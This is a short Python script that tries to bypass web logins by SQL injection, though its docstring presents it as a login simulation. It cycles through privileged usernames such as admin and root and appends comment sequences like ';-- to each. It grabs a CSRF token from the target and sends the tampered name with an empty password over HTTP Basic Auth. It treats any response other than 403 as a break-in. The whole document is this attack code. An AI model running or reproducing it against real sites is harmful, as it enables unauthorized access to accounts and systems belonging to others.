import requests
from requests.exceptions import ConnectionError 
from requests.auth import HTTPBasicAuth

def test_login_attempts(url):
    """
    This function simulates login attempts using predefined input.
    """
    usernames = ["owner", "root", "admin", "user", "support", "operator"]
    for username in usernames:
        if perform_login_attempt(username, url):
            return True
    return False


def perform_login_attempt(username: str, url: str) -> bool:    
    try:
        for quote in ["\';--", '\";--']:
            response = requests.get(url)
            json_data = response.json()
            csrf_token = json_data.get('csrfmiddlewaretoken', None)
            if csrf_token:
                # Step 2: Create headers with the CSRF token and send a POST request
                headers = {"Cookie": f"csrftoken={csrf_token}"}
                response = requests.post(url, auth=HTTPBasicAuth(username + quote, ''), headers=headers)
            print(response.status_code)
            if response.status_code != 403:
                return True  # Successful login attempt
        else:
            print("Failed")
            return False  # Failed login attempt

    except ConnectionError:
        print("Connection Error!")
        return False

    except Exception as e:
        print(f"An error occurred during requests: \n{e}")
        return False

